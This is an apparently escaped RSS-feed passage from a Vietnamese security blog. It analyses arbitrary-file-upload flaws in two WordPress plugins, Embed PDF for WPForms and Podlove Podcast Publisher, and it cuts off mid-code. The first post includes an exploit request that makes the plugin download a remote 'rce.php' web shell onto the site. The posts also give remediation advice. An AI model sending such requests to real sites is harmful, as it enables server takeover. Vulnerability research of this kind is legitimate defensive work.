wp-settings-time-5=1761992371&#xA;...&#xA;&#xA;_ajax_nonce=ea2ccf0ccd&amp;amp;action=epdf_wf_download_pdf_media&amp;amp;url=https://github.com/w41bu1/w41test/raw/refs/heads/main/rce.php&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;5&#34;&gt;&#xA;&lt;li&gt;Truy cập file vừa tạo và RCE&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-06-cve-2025-10647/result.png&#34; title=&#34;RCE với file upload&#34; data-thumbnail=&#34;/posts/2025-11-06-cve-2025-10647/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;RCE với file upload&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-06-cve-2025-10647/result.png&#39; alt=&#34;Result&#34; height=&#34;619&#34; width=&#34;1145&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;RCE với file upload&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng cho phép &lt;strong&gt;arbitrary file upload&lt;/strong&gt; trong &lt;code&gt;ajax_handler_download_pdf_media()&lt;/code&gt; là do thiếu kiểm tra quyền và kiểu file khi tải file từ URL, dẫn đến khả năng kẻ tấn công có tài khoản Subscriber tải lên file thực thi (ví dụ &lt;code&gt;.php&lt;/code&gt;) và gây &lt;strong&gt;RCE&lt;/strong&gt;. Nhà phát triển đã khắc phục bằng cách kiểm tra &lt;code&gt;current_user_can(&#39;upload_files&#39;)&lt;/code&gt; và xác thực MIME với &lt;code&gt;wp_check_filetype()&lt;/code&gt; trong phiên bản &lt;strong&gt;1.1.6&lt;/strong&gt;. Đối với site bị ảnh hưởng, cần cập nhật lên 1.1.6 ngay, kiểm tra và xoá các file khả nghi trong thư mục uploads, rà soát quyền người dùng và nhật ký để phát hiện dấu hiệu khai thác.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaway&#34;&gt;&lt;span&gt;Key Takeaway&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaway&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Luôn kiểm tra quyền người dùng (&lt;code&gt;current_user_can&lt;/code&gt;) trước khi thực hiện upload qua AJAX.&lt;/li&gt;&#xA;&lt;li&gt;Luôn xác thực kiểu/MIME của file (&lt;code&gt;wp_check_filetype&lt;/code&gt; / whitelist) trước khi lưu.&lt;/li&gt;&#xA;&lt;li&gt;Cập nhật plugin nhanh chóng khi có bản vá; rà soát file upload và log sau khi phát hiện lỗi.&lt;/li&gt;&#xA;&lt;li&gt;Áp dụng nguyên tắc ít quyền nhất (least privilege) và giám sát hành vi bất thường trong media/uploads.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Arbitrary File Upload&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/embed-pdf-wpforms/vulnerability/wordpress-embed-pdf-for-wpforms-plugin-1-1-5-authenticated-subscriber-arbitrary-file-upload-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Embed PDF for WPForms Plugin &amp;lt;= 1.1.5 is vulnerable to Arbitrary File Upload&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-10147 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-11-05-cve-2025-10147/</link>
      <pubDate>Wed, 05 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-11-05-cve-2025-10147/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-05-cve-2025-10147/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;Podlove Podcast Publisher&lt;/strong&gt; cho &lt;strong&gt;WordPress&lt;/strong&gt; có lỗ hổng cho phép &lt;strong&gt;arbitrary file uploads&lt;/strong&gt; do thiếu kiểm tra loại tệp trong hàm &lt;code&gt;&#39;move_as_original_file&#39;&lt;/code&gt; ở tất cả các phiên bản tới và bao gồm &lt;strong&gt;4.2.6&lt;/strong&gt;. Điều này cho phép &lt;strong&gt;unauthenticated attackers&lt;/strong&gt; tải lên các tệp tùy ý lên máy chủ của site bị ảnh hưởng, điều có thể dẫn tới &lt;strong&gt;remote code execution&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-10147&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-10147&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Arbitrary File Upload&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 4.2.6&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 4.2.7&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (10)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/podlove-podcasting-plugin-for-wordpress/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Podlove Podcast Publisher Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;Podlove Podcast Publisher&lt;/strong&gt;: &lt;strong&gt;4.2.6&lt;/strong&gt; (vulnerable) và &lt;strong&gt;4.2.7&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Theo mô tả của CVE thì vị trí lỗi nằm ở hàm &lt;code&gt;move_as_original_file()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function move_as_original_file($file)&#xA;{&#xA;    $move_new_file = @rename($file, $this-&amp;gt;original_file());&#xA;&#xA;    if (false === $move_new_file) {&#xA;        Log::get()-&amp;gt;addWarning(&#xA;            sprintf(&#xA;                __(&amp;#39;Podlove Image Cache: The downloaded image could not be moved to %s.&amp;#39;),&#xA;                $this-&amp;gt;original_file()&#xA;            )&#xA;        );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;move_as_original_file($file)&lt;/code&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Thực hiện &lt;strong&gt;di chuyển file tạm &lt;code&gt;$file&lt;/code&gt;&lt;/strong&gt; (vừa được tải về từ URL)&#xA;→ sang &lt;strong&gt;đường dẫn cố định&lt;/strong&gt; trả về bởi &lt;code&gt;$this-&amp;gt;original_file()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;rename()&lt;/code&gt; trong PHP = &lt;strong&gt;move file&lt;/strong&gt; (chuyển vị trí file, không copy).&lt;/li&gt;&#xA;&lt;li&gt;Dấu &lt;code&gt;@&lt;/code&gt; dùng để &lt;strong&gt;ẩn lỗi PHP&lt;/strong&gt; nếu thao tác thất bại.&lt;/li&gt;&#xA;&lt;li&gt;Nếu &lt;code&gt;rename()&lt;/code&gt; trả về &lt;code&gt;false&lt;/code&gt;, plugin ghi cảnh báo vào log.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function original_file()&#xA;{&#xA;    return implode(DIRECTORY_SEPARATOR, [&#xA;        $this-&amp;gt;upload_basedir, $this-&amp;gt;file_name(&amp;#39;original&amp;#39;)&#xA;    ]);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;→ Tạo &lt;strong&gt;đường dẫn tuyệt đối trên server&lt;/strong&gt;, ví dụ:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;/var/www/html/wp-content/cache/podlove/6e/7262f37a8018efafa4764ea97a4c26/original.png&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;$this-&amp;gt;upload_basedir&lt;/code&gt; (từ &lt;code&gt;__construct()&lt;/code&gt;)&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;Class Image {&#xA;    public function __construct($url, $file_name = &amp;#39;&amp;#39;)&#xA;    {&#xA;        // FIXME: if $file_name is empty, the url will not work. I must not treat this silently!&#xA;        $this-&amp;gt;source_url = trim($url ?? &amp;#39;&amp;#39;);&#xA;        $this-&amp;gt;file_name = sanitize_title($file_name);&#xA;&#xA;        // manually remove troublemaking characters&#xA;        // @see https://community.podlove.org/t/solved-kind-of-cover-art-disappears-caching-issue/478/&#xA;        // @see https://sendegate.de/t/problem-mit-caching-von-grafiken/2947&#xA;        if (function_exists(&amp;#39;iconv&amp;#39;)) {&#xA;            $this-&amp;gt;file_name = iconv(&amp;#39;UTF-8&amp;#39;, &amp;#39;ASCII//TRANSLIT&amp;#39;, $this-&amp;gt;file_name);&#xA;        }&#xA;        $this-&amp;gt;file_name = preg_replace(&amp;#39;~[^-a-z0-9_]&amp;#43;~&amp;#39;, &amp;#39;&amp;#39;, $this-&amp;gt;file_name);&#xA;&#xA;        $this-&amp;gt;file_extension = $this-&amp;gt;extract_file_extension();&#xA;        $this-&amp;gt;id = md5($url.$this-&amp;gt;file_name);&#xA;&#xA;        // create subdirectories to avoid too many directories in the root directory&#xA;        $id_directory = substr($this-&amp;gt;id, 0, 2).&amp;#39;/&amp;#39;.substr($this-&amp;gt;id, 2);&#xA;&#xA;        $this-&amp;gt;upload_basedir = self::cache_dir().$id_directory;&#xA;        $this-&amp;gt;upload_baseurl = content_url(&amp;#39;cache/podlove/&amp;#39;).$id_directory;&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Được tạo dựa trên &lt;code&gt;cache_dir()&lt;/code&gt; và hash MD5 của URL,&#xA;→ nằm trong thư mục:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;wp-content/cache/podlove/&amp;lt;2 ký tự đầu&amp;gt;/&amp;lt;phần còn lại&amp;gt;/&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;alert alert-tip&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M8 1.5c-2.363.0-4 1.69-4 3.75.0.984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75.0 01-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456.0 00-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863.0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751.0 01-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304.0-2.06-1.637-3.75-4-3.75zM5.75 12h4.5a.75.75.0 010 1.5h-4.5a.75.75.0 010-1.5zM6 15.25a.75.75.0 01.75-.75h2.5a.75.75.0 010 1.5h-2.5A.75.75.0 016 15.25z&#34;/&gt;&lt;/svg&gt;Mẹo&lt;/p&gt;&lt;p&gt;Ở đây ta có thể chỉ truyền mỗi &lt;code&gt;$url&lt;/code&gt;, ví dụ:&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;$url=&amp;quot;https://example.com/filename.php&amp;quot;&lt;/code&gt; thì &lt;code&gt;$this-&amp;gt;id=&amp;quot;b1555a128239e3f59ccfb8d17e5b6c5a&amp;quot;&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;$this-&amp;gt;upload_basedir=&amp;quot;http://localhost/wp-content/cache/podlove/b1/555a128239e3f59ccfb8d17e5b6c5a&amp;quot;&lt;/code&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition success open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-check&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Ta có thể kiểm soát được đường dẫn của file được tạo.&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;move_as_original_file()&lt;/code&gt; được gọi trong hàm &lt;code&gt;download_source()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function download_source()&#xA;{&#xA;    $source_url = $this-&amp;gt;source_url;&#xA;    ...&#xA;    $source_domain = wp_parse_url($source_url, PHP_URL_HOST);&#xA;    $current_domain = explode(&amp;#39;:&amp;#39;, $_SERVER[&amp;#39;HTTP_HOST&amp;#39;])[0];&#xA;&#xA;    // if domains match, see if the image is part of the Publisher&#xA;    // and can be copied on the filesystem, skipping http&#xA;    if ($current_domain == $source_domain) {&#xA;        ...&#xA;        return;&#xA;    }&#xA;    // for download_url()&#xA;    require_once ABSPATH.&amp;#39;wp-admin/includes/file.php&amp;#39;;&#xA;    $result = self::download_url($this-&amp;gt;source_url);&#xA;    ...&#xA;    list($temp_file, $response) = $result;&#xA;&#xA;    if (!\Podlove\is_image($temp_file)) {&#xA;        ...&#xA;        wp_delete_file($temp_file);&#xA;        return;&#xA;    }&#xA;&#xA;    $this-&amp;gt;create_basedir();&#xA;    $this-&amp;gt;save_cache_data($response);&#xA;    $this-&amp;gt;move_as_original_file($temp_file);&#xA;    wp_delete_file($temp_file);&#xA;    $this-&amp;gt;add_donotbackup_dotfile();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm này tải ảnh từ URL người dùng cung cấp, kiểm tra hợp lệ, rồi lưu cố định vào thư mục cache của plugin. Cụ thể:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&lt;code&gt;$source_url&lt;/code&gt; lấy URL hình ảnh do người dùng cung cấp.&lt;/li&gt;&#xA;&lt;li&gt;Hàm tách domain từ &lt;code&gt;$source_url&lt;/code&gt; và domain hiện tại của site (&lt;code&gt;$_SERVER[&#39;HTTP_HOST&#39;]&lt;/code&gt;).&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Nếu hai domain trùng nhau → ảnh nằm trong cùng site thực hiện logic và trả về.&lt;/li&gt;&#xA;&lt;li&gt;Nếu khác domain → dùng &lt;code&gt;download_url()&lt;/code&gt; để tải file tạm về máy chủ.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function download_url($url, $timeout = 300, $extra_args = [])&#xA;{&#xA;    ...&#xA;    $tmpfname = wp_tempnam($url);&#xA;    if (!$tmpfname) {&#xA;        return new \WP_Error(&amp;#39;http_no_file&amp;#39;, __(&amp;#39;Could not create Temporary file.&amp;#39;));&#xA;    }&#xA;&#xA;    $default_args = [&#xA;        &amp;#39;timeout&amp;#39; =&amp;gt; $timeout,&#xA;        &amp;#39;stream&amp;#39; =&amp;gt; true,&#xA;        &amp;#39;filename&amp;#39; =&amp;gt; $tmpfname,&#xA;        &amp;#39;sslverify&amp;#39; =&amp;gt; \Podlove\get_setting(&amp;#39;website&amp;#39;, &amp;#39;ssl_verify_peer&amp;#39;) == &amp;#39;on&amp;#39;,&#xA;    ];&#xA;    $args = array_merge($default_args, $extra_args);&#xA;&#xA;    $response = wp_safe_remote_get($url, $args);&#xA;&#xA;    if (is_wp_error($response)) {&#xA;        wp_delete_file($tmpfname);&#xA;&#xA;        return $response;&#xA;    }&#xA;&#xA;    if (200 != wp_remote_retrieve_response_code($response)) {&#xA;        wp_delete_file($tmpfname);&#xA;&#xA;        return new \WP_Error(&amp;#39;http_404&amp;#39;, trim(wp_remote_retrieve_response_message($response)));&#xA;    }&#xA;&#xA;    return [$tmpfname, $response];&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;download_url()&lt;/code&gt; tải nội dung từ URL vào file tạm trên server và trả về &lt;strong&gt;đường dẫn file đó&lt;/strong&gt; cùng &lt;strong&gt;response&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Kiểm tra xem file tải về có phải ảnh hợp lệ bằng &lt;code&gt;\Podlove\is_image()&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;function is_image($file)&#xA;{&#xA;    $type = get_image_type($file);&#xA;    $mime = get_image_mime_type($type);&#xA;&#xA;    return substr($mime, 0, 5) == &amp;#39;image&amp;#39;;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Ở bản lỗi, hàm &lt;code&gt;is_image()&lt;/code&gt; chỉ &lt;strong&gt;kiểm tra MIME type&lt;/strong&gt; của file - cụ thể là lấy kiểu MIME rồi xem nó có bắt đầu bằng &amp;ldquo;image&amp;rdquo; không.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Lỗi&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;Chỉ cần file giả dạng có header giống ảnh (ví dụ file &lt;code&gt;.php&lt;/code&gt; nhưng chèn vài byte ảnh đầu tiên &lt;code&gt;image/png&lt;/code&gt;) là qua mặt được ngay 😬&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;pre&gt;&lt;code&gt;function is_image($file, $filename = &amp;#34;&amp;#34;)&#xA;{&#xA;    // simple PHP based checks&#xA;    $type = get_image_type($file);&#xA;    $mime = get_image_mime_type($type);&#xA;    $mime_is_image = substr($mime, 0, 5) == &amp;#39;image&amp;#39;;&#xA;&#xA;    // more checks using WP 